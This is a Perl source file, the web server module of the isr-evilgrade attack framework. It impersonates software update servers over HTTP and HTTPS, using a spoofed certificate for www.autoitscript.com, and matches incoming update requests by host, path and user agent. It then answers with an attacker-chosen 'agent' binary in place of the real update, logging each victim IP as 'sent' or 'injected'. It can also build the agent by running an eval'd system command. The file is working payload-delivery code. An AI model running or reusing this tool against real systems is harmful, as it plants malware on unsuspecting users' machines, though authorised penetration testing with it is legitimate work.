
###############
# webserver.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package isrcore::webserver;

use strict;
use Errno qw( EAGAIN );

#external modules
use IO::Socket;
use IO::Socket::SSL;
use IO::Select;
use isrcore::utils;
use POSIX ":sys_wait_h";
use Data::Dump qw(dump);
use File::Basename;

$SIG{INT} = sub { die "$$ dying\n" };

sub catch_zap {
    my $signame = shift;
    return 1;
}

$SIG{HUP} = \&catch_zap;    # best strategy

my $base = {
    'port'    => 80,
    'sslport' => 443,
    'request' => "",
    'users'   => undef,
    'current' => undef,
    'error'   => "",
    'whoami'  => "WEBSERVER",
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES      class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };

    return bless $self, $class;
}

##########################################################################
# FUNCTION      start
# RECEIVES      [shellzobj]
# RETURNS
# EXPECTS
# DOES      start webserver
sub start {

    my $self   = shift;
    my $shellz = shift;

    #ignore child process avoid zombies.
    $SIG{CHLD} = 'IGNORE';

    #create socket

    my $listen_socket = IO::Socket::INET->new(
        LocalPort => $self->{'Base'}->{'port'},
        Listen    => 10,
        Proto     => 'tcp',
        Reuse     => 1
    );

    my $ssl_socket = IO::Socket::INET->new(
        LocalPort => $self->{'Base'}->{'sslport'},
        Listen    => 10,
        Proto     => 'tcp',
        Reuse     => 1
    );

    # verify socket status
    if ( !$listen_socket ) {
        $self->{'Base'}->{'error'}
            = "[$self->{'Base'}->{'whoami'}] - Cant't create a listening socket: $@";
        return;
    }
    if ( !$ssl_socket ) {
        $self->{'Base'}->{'error'}
            = "[$self->{'Base'}->{'whoami'}] - Cant't create a listening SSL socket: "
            . &IO::Socket::SSL::errstr . "\n";
        return;
    }

    $shellz->printshell(
        "[$self->{'Base'}->{'whoami'}] - Webserver ready. Waiting for connections ...\n"
    );

    # waiting for connection

    my $rset = new IO::Select();
    $rset->add($listen_socket);
    $rset->add($ssl_socket);

    while ( my ($any_reader) = IO::Select->select( $rset, undef, undef ) ) {
        my $nsock;
        foreach $nsock (@$any_reader) {
            if ( $nsock == $listen_socket ) {

                $shellz->printshell(
                    "[$self->{'Base'}->{'whoami'}] - WebServer Client on "
                        . $self->{'Base'}->{'port'}
                        . "\n" );
                my $connection = $listen_socket->accept;

                $self->accept_client( $shellz, $connection, $listen_socket,
                    0 );

            }
            elsif ( $nsock == $ssl_socket ) {
                $shellz->printshell(
                    "[$self->{'Base'}->{'whoami'}] - (SSL) WebServer Client on "
                        . $self->{'Base'}->{'sslport'}
                        . "\n" );

                my $connection = $ssl_socket->accept;
                $self->accept_client( $shellz, $connection, $ssl_socket, 1 );

            }

        }

    }

}

##########################################################################
# FUNCTION      accept_client
# RECEIVES      shellz , client sock, server sock, ssl_opt ( 1=true, 0=false)
# RETURNS
# EXPECTS
# DOES      Accept client. Fork and promote to ssl if required. This could be avoided using just IO::Socket::SSL->new,
#               buts , its recommended to promote on fork as specs suggests.

sub accept_client {
    my $self   = shift;
    my $shellz = shift;

    my $connection  = shift;
    my $listener    = shift;
    my $promote_ssl = shift;

    my $child;

    # create fork
    die "[FATAL] Can't fork: $!" unless defined( $child = fork() );

    if ( $child == 0 ) {    #child
                            # close listen port
        $listener->close();
        if ( ref($connection) eq "IO::Socket::SSL" or $promote_ssl ) {

            $connection = IO::Socket::SSL->start_SSL(
                $connection,
                SSL_startHandshake => 0,
                SSL_server         => 1,
                SSL_verify_mode    => 0x00,
                SSL_cert_file      => 'certs/www.autoitscript.com-cert.pem',
                SSL_key_file       => 'certs/www.autoitscript.com-key.pem',
                SSL_passwd_cb      => sub { return "test" },
            );

            if ( !$connection->accept_SSL() ) {
                exit 0;
            }

        }
        else {
            $listener->close();
        }
        $| = 1;    #TODO: usar pipe
                   #  #call response function
        $self->response( $shellz, $connection );

        exit 0;
    }
    else {         #father
                   #   #Connection information
        $shellz->printshell(
            "[$self->{'Base'}->{'whoami'}] - ["
                . $connection->peerhost
                . "] - Connection recieved... \n",
            1
        );

        # Close connection.
        if ( ref($listener) eq "IO::Socket::SSL" ) {
            $connection->close( SSL_no_shutdown => 1 );
        }
        else {
            $connection->close();
        }
    }
}

##########################################################################
# FUNCTION      loadconfig
# RECEIVES
# RETURNS
# EXPECTS
# DOES      load webserver configuration
sub loadconfig {
    my $self   = shift;
    my $config = shift;

    #general webserver
    $self->{'Base'}->{'port'}
        = $config->{'Base'}->{'options'}->{'port'}->{'val'};
    $self->{'Base'}->{'sslport'}
        = $config->{'Base'}->{'options'}->{'sslport'}->{'val'};

    my $i = 0;    #number of modules
                  #modules configuration
    my @current;
    my @request;

    # delete old active modules
    delete( $self->{'current'} );

    foreach my $name ( keys %{ $config->{'modules'} } ) {

        my $module = $config->{'modules'}->{$name};

        #Verify enable module
        if ( $module->{'Base'}->{'options'}->{'enable'}->{'val'} == 1 ) {
            my $check = $self->loadmodule($module);
            return "(*) [Module:$name] $check" if ( $check != 1 );
            push( @current, $name );
            push( @request, $module );
            $i++;
        }
    }
    return
        "[$self->{'Base'}->{'whoami'}] - (*) You didn't have any active module\n"
        if ( $i == 0 );
    $self->{'current'} = \@current;
    $self->{'request'} = \@request;
    return 1;
}

##########################################################################
# FUNCTION      loadmodule
# RECEIVES
# RETURNS
# EXPECTS
# DOES      module's loader
sub loadmodule {
    my $self   = shift;
    my $module = shift;
    local *FILE;
    my $error;

    #TODO: Checkear en caso de ejecucion, tambien size
    my $agent = $module->{'Base'}->{'options'}->{'agent'}->{'val'};

    ( $agent, undef, undef, undef, $error ) = $self->checkagent($agent);
    return "Agent ($agent) did not exists\n" if ($error);

    $module->{'Base'}->{'options'}->{'url_file'}->{'val'}     = '';
    $module->{'Base'}->{'options'}->{'url_file_ext'}->{'val'} = '';

    #Agent size
    my $agentsize = -s $agent;
    $module->{'Base'}->{'options'}->{'agentsize'}->{'val'} = $agentsize;

    my ( $digest, $merror ) = isrcore::utils::getmd5($agent);
    $module->{'Base'}->{'options'}->{'agentmd5'}->{'val'} = $digest;

    my ( $digest, $merror ) = isrcore::utils::getsha256($agent);
    $module->{'Base'}->{'options'}->{'agentsha256'}->{'val'} = $digest;

    foreach my $request ( @{ $module->{'Base'}->{'request'} } ) {
        if ( $request->{'type'} eq 'file' ) {
            open( FILE, '<' . $request->{'file'} )
                || return
                "[$self->{'Base'}->{'whoami'}] - (*) Filename $request->{'file'} did not exists\n";
            close(FILE);
        }
    }
    return 1;
}
##########################################################################
# FUNCTION      stop
# RECEIVES
# RETURNS
# EXPECTS
# DOES      stop webserver
sub stop {
    my $self = shift;

    kill HUP => $self->{'Base'}->{'child'};
    $self->{'Base'}->{'child'} = 0;
    delete( $self->{'current'} );    #delete current modules

    return;
}

##########################################################################
# FUNCTION      status
# RECEIVES
# RETURNS
# EXPECTS
# DOES      webserver status
sub status {
    my $self = shift;
    if ( $self->{'Base'}->{'child'}
        && waitpid( $self->{'Base'}->{'child'}, WNOHANG ) != -1 )
    {
        return 1;
    }
    else {
        $self->{'Base'}->{'child'} = 0;
        return 0;
    }
}

##########################################################################
# FUNCTION      response
# RECEIVES      shellzobj,client's socket
# RETURNS
# EXPECTS
# DOES      process webserver's request
sub response {
    my $self   = shift;
    my $shellz = shift;
    my $socket = shift;
##    print dump ($socket);

    my $clientip = $socket->peerhost;
    my $buff     = <$socket>;

#    my $keep; #keep-alive connection
# $shellz->printshell("Certificate: ".$socket->peer_certificate("subject") ."\n",1);
    $buff =~ /^[\w]+[ \t]+([\S ]+)[\t ]+HTTP\/[\d]\.[\d]\r\n$/i;  #Get request
    my $creq = $1;

    ##### Add method
    $buff =~ /^([\w]+)[ \t]+[\S ]+[\t ]+HTTP\/[\d]\.[\d]\r\n$/i;  #Get request
    my $method = $1;

#$shellz->printshell("[$self->{'Base'}->{'whoami'}] -[$clientip] - METHOD: ".dump($method)."\n",1);
    #### fin add method

    my $vh        = "novirtual";
    my $useragent = "none";

    $shellz->printshell(
        "[$self->{'Base'}->{'whoami'}] -[$clientip] - Packet request: "
            . dump($buff) . "\n",
        1
    );

    #TODO: ver timeout socket
    while ( $buff = <$socket> ) {    #Get headers
        print dump($buff);
        if ( $buff =~ /^\r\n$/ ) {
            last;
        }
        if ( $buff =~ /^host\:[ \t]+([\.\w-_]+)[\r\:\d\n]+$/i )
        {    #TODO: arreglar esto, esta feo (duplicacion)
            $vh = $1;
        } elsif ( $buff =~ /^host\:([\.\w-_]+)[\r\:\d\n]+$/i )
        {
            $vh = $1;
        } elsif ( $buff =~ /^User\-Agent\: (.*?)$/ ) # get User-Agent
        {
            $useragent = $1;
        }

    }

    # TODO: ver que pasa con los tipos de updates que no es 80 standard
    # print "VM = ($vh), CREQ = ($creq)\n";

    if ( !$vh && !$creq ) {    #if didn't get vm

        $socket->close;
        return;
    }

    #Recorrer los request
    foreach my $module ( @{ $self->{'request'} } ) {
        # Skip if the vh does not match the module's vh and either the useragent option has been disabled nor exists, skip to next one.

        # $shellz->printshell("\n[*] CURRENT MODULE: $module->{'Base'}->{'name'};\n");
        # $shellz->printshell("\n[*][1] Checking whether virtualhost matches request.");
        # If current module's virtualhost does not match request's
        if ($module->{'Base'}->{'vh'} !~ $vh)
        {
            # $shellz->printshell("\n[*][2] Virtualhost dit not match.");
            # If useragent option not defined skip.
            if (!defined($module->{'Base'}->{'useragent'}))
            {
                # $shellz->printshell("\n[*][3] User agent undefined. Next.");
                next;
            }

            # $shellz->printshell("\n[*][4] User agent defined.");
            # If useragent defined but does not equal to 'true'
            if (defined($module->{'Base'}->{'useragent'})
                && $module->{'Base'}->{'useragent'} ne 'true')
            {
                # $shellz->printshell("\n[*][5] User agent defined but disabled.");
                next;
            }

            # $shellz->printshell("\n[*][6] Useragent defined and enabled.");
        } else
        {
            # $shellz->printshell("\n[*][7] Virtualhost matched.");
        }



        my $req = $module->{'Base'}->{'request'};
        foreach my $item ( @{$req} ) {


            # If the curent module's HTTP request matches
            if ($creq =~ /$item->{'req'}/)
            {
                # $shellz->printshell("\n[*][8] Request matched current module req.");
                # If useragent defined, enabled and does not match, skip.
                if (defined($module->{'Base'}->{'useragent'})
                    && ($module->{'Base'}->{'useragent'} eq 'true')
                    && ($useragent !~ $item->{'useragent'}) )
                {
                    # $shellz->printshell("\n[*][9] UserAgent enabled but did not match. Next. ");
                    next;
                }

                # If the req's vh is defined and does not match current, skip.
                if (defined( $item->{'vh'} )
                    && $vh !~ $item->{'vh'} )
                {
                    # $shellz->printshell("\n[*][10] Current module's req has vh defined but did not match with request. Next.");
                    next;
                }

                # If the req's method does not match current, skip.
                if ( $item->{'method'} ne "" && $method !~ $item->{'method'} )
                {
                    # $shellz->printshell("\n[*][11] Request's method did not match module's one. Next.");
                    next;
                }

                my $modname = ref($module);
                $shellz->printshell(
                    "[$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Request: "
                        . dump( $item->{'req'} )
                        . "\n" );
                $shellz->sendcommand(
                    "<acc><action>update</action><module>$modname</module><ip>$clientip</ip></acc>\n"
                );
                my ( $header, $cmd, $md5, $sha256 );
                my $file = $item->{'file'};

                #If it's agent type set correct file
                $file = $module->{'Base'}->{'options'}->{'agent'}->{'val'}
                    if ( $item->{'type'} eq 'agent' );

                #set request option
                $module->{'Base'}->{'options'}->{'request'}->{'val'} = $creq;

                #set url options
                my ( $urlfile, $urldir, $urlext )
                    = fileparse( $creq, qr/\.[^.]*/ );
                $module->{'Base'}->{'options'}->{'url_file'}->{'val'}
                    = $urlfile;
                $module->{'Base'}->{'options'}->{'url_file_ext'}->{'val'}
                    = $urlext;

                fileparse( $creq, qr/\.[^.]*/ );

                #       print dump($module);

                local *REQ;
                if ( $item->{'bin'} == 1 ) {    #binary request
                                                #check agent type
                    ( $file, $cmd, $md5, $sha256 )
                        = $self->checkagent( $file, $shellz, 1 );
                    open( REQ, $file )
                        || die
                        "[FATAL] - [$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Can't open file ($file)";
                    binmode(REQ);               #windows compatibily

                    $header = getheader( undef, $file, $item, $module );
                    print $socket $header;
                    my $read_status  = 1;
                    my $print_status = 1;
                    my $chunk;

                    #read and send binary information
                    while ( $read_status && $print_status ) {
                        $read_status = read( REQ, $chunk, 1024 );
                        if ( defined $chunk && defined $read_status ) {
                            $print_status = print $socket $chunk;
                        }
                        undef $chunk;
                    }
                    close REQ;

                }
                elsif ( $item->{'type'} =~ /^string|install$/ ) { #string type
                    my $data = $item->{'string'};
                    if ( $item->{'parse'} eq "1" ) {
                        $shellz->printshell(
                            "[$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Parsing: "
                                . dump( $item->{'string'} ) . "\n",
                            1
                        );
                        $data = $self->parsedata( $data, $module );
                    }
                    $header = getheader( $data, undef, $item, $module );
                    print $socket $header;
                    print $socket $data;

                }
                else {    #textplain request

                    open( REQ, $file )
                        || die
                        "[FATAL] - [$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Can't open file ($file)";
                    my $data = join( /\n/, <REQ> );
                    close(REQ);

                    if ( $item->{'parse'} eq "1" ) {
                        $shellz->printshell(
                            "[$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Parsing: "
                                . dump( $item->{'file'} ) . "\n",
                            1
                        );
                        $data = $self->parsedata( $data, $module );
                    }

                    $header = getheader( $data, undef, $item, $module );
                    print $socket $header;
                    print $socket $data;

                }

                if ( $item->{'type'} eq 'agent' ) {    #agent sent
                    $shellz->printshell(
                        "[$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Agent sent: "
                            . dump($file)
                            . "\n" );
                    $shellz->sendcommand(
                        "<acc><action>sent</action><module>$modname</module><ip>$clientip</ip><md5>$md5</md5><sha256>$sha256</sha256><cmd>$cmd</cmd><file>"
                            . dump($file)
                            . "</file></acc>\n" );
                }
                elsif ( $item->{'type'} eq 'install' ) {
                    $shellz->printshell(
                        "[$self->{'Base'}->{'whoami'}] - [$modname] - [$clientip] - Agent injected\n"
                    );
                    $shellz->sendcommand(
                        "<acc><action>installed</action><module>$modname</module><ip>$clientip</ip></acc>\n"
                    );

                }
        #       if ($item->{'keep'}){
        #           $shellz->printshell("[$self->{'Base'}->{'whoami'}] - [              $modname] - [# $clientip] - LOOP \n");
        #           $keep = 1;
        #       }
                #before request
                $module->{'Base'}->{'options'}->{'brequest'}->{'val'}
                    = $creq . 1;
                last;
            }

        }
        # If we already sent a reply and matched a module with a response, stop looping.
        # $shellz->printshell("\n[*][12] A module already answered so no need to go finding another.");
        last;
    }

#    if ($keep) {
#   my $info;
#        $shellz->printshell("[$self->{'Base'}->{'whoami'}] - inside keep $keep ($info)\n");
#
#   while (1){
#           $info = <$socket>;
#           $shellz->printshell("[$self->{'Base'}->{'whoami'}] - inside keep $keep ($info)\n");
#       #$self->response($shellz,$socket);
#   }
#    }
    $socket->close;
}
##########################################################################
# FUNCTION      checkagent
# RECEIVES      data,moduleobj
# RETURNS   "path",$cmd,md5,sha256, error
# EXPECTS
# DOES          detect agent type, return or execute the custom agent generator
sub checkagent {
    my $self   = shift;
    my $agent  = shift;
    my $shellz = shift;
    my ( $cmd, $mret, $digest, $sha256, $error );
    $cmd = "";
    if ( $agent =~ /^\[([\w\W]+)\]$/ ) {    #agent generation
        $cmd = eval($1);                              #Convert code in string
        $cmd =~ /\<\%OUT\%\>([\w\W]+)\<\%OUT\%\>/;    #get output file

        my $out = $1;                                 #output file

        $shellz->printshell(
            "[$self->{'Base'}->{'whoami'}] Agent destination file ($out)\n",
            1 )
            if ($shellz);
        $cmd =~ s/\<\%OUT\%\>//g;                     #clean execv

        $shellz->printshell(
            "[$self->{'Base'}->{'whoami'}] Executing ($cmd)\n", 1 )
            if ($shellz);

        $mret = system($cmd);

#$shellz->printshell("[$self->{'Base'}->{'whoami'}] Execution response: ($mret)\n",1) if ($shellz);

        $agent = $out;
    }
    ( $digest, $error ) = isrcore::utils::getmd5($agent);
    ( $sha256, $error ) = isrcore::utils::getsha256($agent);

    return ( $agent, $cmd, $digest, $sha256, $error );

}
##########################################################################
# FUNCTION      header
# RECEIVES      string,file,obj item request
# RETURNS
# EXPECTS
# DOES      parse data with option available
sub getheader {
    my $string = shift;
    my $file   = shift;
    my $item   = shift;
    my $module = shift;
    my $header;
    my $size;

    if ( $item->{'cheader'} ) {    #custom header detected
        $header .= $item->{'cheader'};
        if ( $item->{'parse'} eq "1" ) {
            $header = parsedata( undef, $header, $module );
        }

    }
    else {

        if ($string) {
            $size = length($string);
        }
        else {
            $size = -s $file;    #TODO: check
        }

        $header .= "HTTP/1.0 200 OK\r\n";

        #   $header .= "Date: Tue, 16 Feb 2010 03:56:52 GMT\r\n"; #
        #   $header .= "Server: Microsoft-IIS/6.0\r\n";#
        #   $header .= "Content-Type: text/html\r\n";#

        #$header .=  "Accept-Ranges: bytes\r\n";#
        #    $header .=  "Content-Type: text/plain\r\n";#
        $header .= "Cache-Control: no-cache \r\n";
        $header .= "Pragma: no-cache \r\n";
        $header .= "Content-length: $size\r\n";

        #    $header .=  "Last-Modified: Sat, 22 Mar 2011 01:38:58 GMT\r\n";
        $header .= "Connection: close \r\n";
        
        if ( $item->{'aheader'} ) {    # append header detected
            $header .= $item->{'aheader'};
        }

        $header .= "\r\n";
    }

    return $header;
}
##########################################################################
# FUNCTION      parsedata
# RECEIVES      data,moduleobj
# RETURNS
# EXPECTS
# DOES      parse data with option available
sub parsedata {
    my $self   = shift;
    my $data   = shift;
    my $module = shift;
    my $val;
    foreach my $option ( keys %{ $module->{'Base'}->{'options'} } ) {
        next if ( $option eq "agent" );
        my $uc = uc($option);
        $val = $module->{'Base'}->{'options'}->{$option}->{'val'};
        if ( $module->{'Base'}->{'options'}->{$option}->{'dynamic'} )
        {    # if it's a dynamic option do eval thing
            $val = eval($val);
        }

        $data =~ s/\<\%$uc\%\>/$val/g;
    }
    return $data;
}
1;
